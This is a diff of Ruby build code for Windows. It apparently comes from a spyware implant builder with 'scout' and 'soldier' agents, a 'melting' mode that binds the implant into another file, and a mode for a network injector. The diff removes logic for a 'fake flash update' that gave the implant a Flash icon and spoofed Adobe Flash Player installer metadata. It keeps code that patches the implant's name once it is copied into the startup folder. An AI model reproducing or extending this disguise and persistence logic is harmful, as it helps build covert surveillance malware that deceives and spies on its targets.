@@ -152,6 +152,7 @@ class BuildWindows < Build
     @bit64 = (params['bit64'] == false) ? false : true
     @codec = (params['codec'] == false) ? false : true
     @scout = (params['scout'] == false) ? false : true
+    @soldier = (params['soldier'] == false) ? false : true
     @melted = params['input'] ? true : false
 
     # choose the correct melting mode
@@ -167,8 +168,6 @@ class BuildWindows < Build
     case melting_mode
       when :silent
         silent()
-        # needed for the fake flash update
-        customize_icon(path('output'), params['icon']) if params['icon'] and not @scout
       when :cooked
         # this is a build for the NI
         cook()
@@ -404,14 +403,8 @@ class BuildWindows < Build
 
   def customize_scout(seed, icon)
 
-    case icon
-      when 'flash'
-        icon_file = "icons/#{icon}.ico"
-        info = {name: 'FlashUtil', version: '11.5.500.104', desc: 'Adobe Flash Player Installer/Uninstaller 11.5 r500', company: 'Adobe Systems Incorporated', copyright: 'Copyright (c) 1996 Adobe Systems Incorporated'}
-      else
-        info = scout_name(seed)
-        icon_file = "icons/#{info[:name]}.ico"
-    end
+    info = scout_name(seed)
+    icon_file = "icons/#{info[:name]}.ico"
 
     # binary patch the name of the scout once copied in the startup
     patch_file(:file => 'scout') do |content|
